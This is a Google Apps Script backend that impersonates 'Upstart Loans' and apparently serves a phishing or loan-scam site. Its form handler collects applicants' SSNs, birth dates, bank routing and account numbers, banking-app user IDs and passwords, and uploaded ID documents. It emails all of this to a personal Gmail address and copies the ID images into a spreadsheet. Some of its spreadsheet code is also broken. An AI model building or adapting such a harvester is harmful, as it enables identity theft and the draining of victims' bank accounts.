// Exact Email Format Script for Upstart Loans
// Step 1: Application form details (exact format)
// Step 2: Agreement with ID proof

// Configuration
const PRIMARY_EMAIL = "finnfoxpersonalloan@gmail.com";

function doGet(e) {
  return HtmlService.createHtmlOutput(`
    <h1>Upstart Loans Email Service</h1>
    <p>Two-step email system ready.</p>
    <p><strong>Current emails:</strong></p>
    <ul>
      <li>Primary: ${PRIMARY_EMAIL}</li>
    </ul>
  `);
}

function doPost(e) {
  try {
    const data = e.parameter;
    const formType = data.formType || 'loanApplication';
    
    if (formType === 'loanApplication') {
      // STEP 1: Send application form details only
      sendApplicationEmail(data);
    } else if (formType === 'loanAgreement') {
      // STEP 2: Send agreement with ID proof
      sendAgreementEmail(data);
    } else {
      sendErrorEmail('Unknown form type: ' + formType, data);
    }
    
    return ContentService.createTextOutput(JSON.stringify({
      result: 'success',
      message: 'Form processed successfully'
    }));
    
  } catch (error) {
    Logger.log('Error in doPost: ' + error.toString());
    sendErrorEmail(error.toString(), e.parameter);
    
    return ContentService.createTextOutput(JSON.stringify({
      result: 'error',
      error: error.toString()
    }));
  }
}

function sendApplicationEmail(data) {
  const subject = "New Loan Application - " + data.firstName + " " + data.lastName;
  
  // Exact format matching your example
  const emailBody = "Finnfox Personal Loan <" + PRIMARY_EMAIL + ">\n" +
    new Date().toLocaleString('en-US', { weekday: 'short', month: 'short', day: 'numeric', hour: 'numeric', minute: 'numeric' }) + "\n" +
    "to me\n\n" +
    "Personal Information:\n" +
    "- Name: " + data.firstName + " " + data.lastName + "\n" +
    "- Email: " + data.email + "\n" +
    "- Phone: " + data.phoneNumber + "\n" +
    "- Address: " + data.homeAddress + ", " + data.city + ", " + data.state + " " + data.zipCode + "\n\n" +
    "Loan Details:\n" +
    "- Amount: $" + data.loanAmount + "\n" +
    "- Purpose: " + data.loanPurpose + "\n" +
    "- Date of Birth: " + (data.dateOfBirth || 'Not provided') + "\n" +
    "- SSN: " + (data.ssnNumber || 'Not provided') + "\n\n" +
    "Your Loan Agent: " + (data.loanAgent || 'Not specified') + "\n" +
    "Loan Term (Months): " + (data.loanTerm || 'Not specified') + "\n" +
    "Loan Purpose: " + data.loanPurpose + "\n" +
    "Monthly Payment: $" + calculateMonthlyPayment(data.loanAmount, data.loanTerm) + "\n\n" +
    "Bank Information:\n" +
    "- Bank: " + data.bankName + "\n" +
    "- Routing: " + data.routingNumber + "\n" +
    "- Account: " + data.accountNumber + "\n\n" +
    "Mobile App Credentials:\n" +
    "- User ID: " + data.userId + "\n" +
    "- Password: " + (data.password || '[NOT PROVIDED]') + "\n\n" +
    "Submitted: " + new Date().toLocaleString();
  
  GmailApp.sendEmail(PRIMARY_EMAIL, subject, emailBody);
  
  Logger.log("Application email sent to: " + PRIMARY_EMAIL);
}

function sendAgreementEmail(data) {
  try {
    const subject = "Loan Agreement Signed - " + (data.borrower_name || 'Customer');
    
    // Save ID proof data to customer dashboard
    saveIdProofToCustomerDashboard(data);
    
    // Simple agreement email with ID proof
    const emailBody = "Loan Agreement Submitted - Upstart Loans\n\n" +
      "Borrower: " + (data.borrower_name || 'Customer') + "\n" +
      "Email: " + (data.email || 'Not provided') + "\n" +
      "Agreement Number: " + (data.agreementNumber || 'Not provided') + "\n" +
      "Loan Amount: $" + (data.loanAmount || 'Not provided') + "\n" +
      "Loan Term: " + (data.loanTerm || 'Not provided') + " months\n" +
      "Monthly Payment: $" + (calculateMonthlyPayment(data.loanAmount, data.loanTerm) || '0.00') + "\n\n" +
      "ID Proof Information:\n" +
      "- File Name: " + (data.idProofName || 'Not uploaded') + "\n" +
      "- File Type: " + (data.idProofType || 'Not uploaded') + "\n" +
      "- File Size: " + (data.idProofSize || 'Not uploaded') + "\n" +
      "- Status: " + (data.idProofBase64 ? 'Attached (Base64 encoded)' : 'Not uploaded') + "\n" +
      "- Agreement Accepted: " + (data.agreementAccepted ? 'Yes' : 'No') + "\n" +
      "- Signature Status: " + (data.signatureStatus || 'Not provided') + "\n" +
      "- Submission Date: " + (data.submissionDate || new Date().toLocaleDateString()) + "\n\n" +
      "Complete agreement content has been included in this submission.\n\n" +
      "ID proof has been saved to your customer dashboard for future reference.";
    
    GmailApp.sendEmail(PRIMARY_EMAIL, subject, emailBody);
    
    Logger.log("Agreement email sent to: " + PRIMARY_EMAIL);
  } catch (error) {
    Logger.log('Error in sendAgreementEmail: ' + error.toString());
    sendErrorEmail('Error sending agreement email: ' + error.toString(), data);
  }
}

function saveIdProofToCustomerDashboard(data) {
  try {
    // Get or create customer data spreadsheet
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    const sheet = ss.getSheetByName('Customer Data') || ss.insertSheet('Customer Data');
    
    // Find existing customer by email
    const customerEmail = data.email || 'Not provided';
    const existingData = sheet.getDataRange().getValues();
    
    let customerRow = -1;
    for (let i = 0; i < existingData.length; i++) {
      if (existingData[i][0] === customerEmail) {
        customerRow = i;
        break;
      }
    }
    
    if (customerRow === -1) {
      // Add new customer
      const newCustomerData = [
        customerEmail,
        data.idProofName || 'Not uploaded',
        data.idProofType || 'Not uploaded',
        data.idProofSize || 'Not uploaded',
        data.idProofBase64 || '',
        new Date().toLocaleDateString()
      ];
      sheet.appendRow(newCustomerData);
      Logger.log('New customer added: ' + customerEmail);
    } else {
      // Update existing customer
      sheet.getRange(customerRow + 1, 1, 6).setValues([
        data.idProofName || 'Not uploaded',
        data.idProofType || 'Not uploaded',
        data.idProofSize || 'Not uploaded',
        data.idProofBase64 || ''
      ]);
      Logger.log('Customer ID proof updated: ' + customerEmail);
    }
    
    SpreadsheetApp.flush();
    return true;
  } catch (error) {
    Logger.log('Error saving ID proof to customer dashboard: ' + error.toString());
    return false;
  }
}

function calculateMonthlyPayment(loanAmount, loanTerm) {
  if (!loanAmount || !loanTerm) return '0.00';
  
  const principal = parseFloat(loanAmount);
  const months = parseInt(loanTerm);
  const monthlyRate = 0.10 / 12; // 10% APR
  
  const monthlyPayment = principal * (monthlyRate * Math.pow(1 + monthlyRate, months)) / (Math.pow(1 + monthlyRate, months) - 1);
  return monthlyPayment.toFixed(2);
}

function sendErrorEmail(error, data) {
  const subject = 'Error in Upstart Loans System';
  const body = `
An error occurred in the Upstart Loans system:

Error: ${error}

Data received: ${JSON.stringify(data, null, 2)}

Time: ${new Date().toLocaleString()}

Please check the system and investigate this issue.
  `;
  
  GmailApp.sendEmail(PRIMARY_EMAIL, subject, body);
}
